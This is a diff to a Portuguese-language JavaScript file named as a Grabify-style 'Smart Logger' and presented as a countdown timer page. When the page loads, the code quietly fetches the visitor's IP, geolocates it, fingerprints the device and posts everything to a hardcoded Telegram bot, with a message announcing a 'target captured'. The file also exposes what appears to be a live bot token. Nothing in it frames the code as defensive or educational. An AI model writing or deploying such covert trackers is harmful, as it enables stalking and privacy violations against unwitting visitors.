@@ -1,6 +1,6 @@
-// script.js - Smart Logger + Nova API de Geolocalização (ip-api.com)
+// script.js - Smart Logger estilo Grabify (versão final)
 
-let targetDate = new Date("2026-04-20T01:46:59").getTime();
+let targetDate = new Date("2026-04-20T01:54:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
@@ -11,7 +11,11 @@ const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
 const CHAT_ID = "8448614204";
 
 function getDeviceInfo() {
-    const info = {
+    const ram = navigator.deviceMemory 
+        ? navigator.deviceMemory + " GB" 
+        : "unknown";
+
+    return {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language || navigator.userLanguage,
@@ -20,11 +24,11 @@ function getDeviceInfo() {
         pixelRatio: window.devicePixelRatio || 1,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+        deviceMemory: ram,
+        isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+        batteryLevel: 'Não disponível',
+        isCharging: 'Não disponível'
     };
-
-    return info;
 }
 
 function sendToTelegram() {
@@ -34,20 +38,23 @@ function sendToTelegram() {
     const device = getDeviceInfo();
 
     const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
-                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n\n` +
+                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                     `🌐 IP: ${userIPv4 || 'Não capturado'}\n` +
                     `📍 Latitude: ${userLatitude || 'Não disponível'}\n` +
                     `📍 Longitude: ${userLongitude || 'Não disponível'}\n\n` +
-                    `📱 Informações do Dispositivo:\n` +
+                    `📱 Dispositivo:\n` +
                     `• Sistema: ${device.platform}\n` +
+                    `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
                     `• Tela: ${device.screen} (${device.pixelRatio}x)\n` +
                     `• Janela: ${device.windowSize}\n` +
                     `• Mobile: ${device.isMobile ? 'Sim' : 'Não'}\n` +
                     `• Idioma: ${device.language}\n` +
-                    `• Fuso Horário: ${device.timezone}\n` +
-                    `• CPU Núcleos: ${device.hardwareConcurrency}\n` +
-                    `• Memória RAM aprox: ${device.deviceMemory} GB\n\n` +
-                    `Não é magia, é habilidade...`;
+                    `• Fuso horário: ${device.timezone}\n` +
+                    `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
+                    `• Memória RAM aprox: ${device.deviceMemory}\n` +
+                    `🔋 Bateria: ${device.batteryLevel} | Carregando: ${device.isCharging}\n` +
+                    `🌐 Online: Sim\n\n` +
+                    `Não é magia, é habilidade isto...`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -56,10 +63,9 @@ function sendToTelegram() {
     })
     .then(res => res.json())
     .then(data => {
-        if (data.ok) console.log("✅ Enviado para Telegram!");
-        else console.error("Telegram Error:", data.description);
+        if (data.ok) console.log("✅ Enviado para Telegram com sucesso!");
     })
-    .catch(err => console.error("Erro Telegram:", err));
+    .catch(err => console.error("Erro ao enviar para Telegram:", err));
 }
 
 function updateTimer() {
@@ -92,30 +98,21 @@ function updateTimer() {
     `;
 }
 
-// ==================== NOVA BUSCA DE IP + LOCALIZAÇÃO ====================
+// Busca IP + Localização (ip-api.com)
 fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
     .then(data => {
         userIPv4 = data.ip;
-        console.log("IP obtido:", userIPv4);
-
-        // Nova API: ip-api.com (mais estável para lat/lon)
-        return fetch(`http://ip-api.com/json/${userIPv4}?fields=status,message,lat,lon,country,city,regionName,isp`);
+        return fetch(`http://ip-api.com/json/${userIPv4}?fields=status,lat,lon`);
     })
     .then(r => r.json())
     .then(data => {
         if (data.status === "success") {
             userLatitude = data.lat || '';
             userLongitude = data.lon || '';
-            console.log("✅ Localização obtida com sucesso:", userLatitude, userLongitude);
-        } else {
-            console.warn("Aviso da API:", data.message);
         }
     })
-    .catch(err => {
-        console.error("Erro ao buscar IP ou localização:", err);
-    });
+    .catch(err => console.error("Erro na busca de localização:", err));
 
-// Inicia o timer
 timerInterval = setInterval(updateTimer, 100);
 updateTimer();
